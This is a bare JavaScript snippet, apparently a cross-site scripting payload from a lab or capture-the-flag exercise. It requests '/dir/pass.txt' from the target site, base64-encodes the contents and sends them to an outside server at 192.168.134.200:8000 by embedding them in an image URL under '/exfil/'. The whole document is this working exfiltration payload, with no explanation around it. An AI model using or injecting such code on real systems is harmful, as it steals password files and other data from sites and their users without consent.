var xhr = new XMLHttpRequest();
xhr.open("GET", "/dir/pass.txt", true);
xhr.onreadystatechange = function(){
  if(xhr.readyState==4){
    var b = btoa(xhr.responseText);
    var i = new Image();
    i.src = "http://192.168.134.200:8000/exfil/" + b + ".jpg";
  }
};
xhr.send();
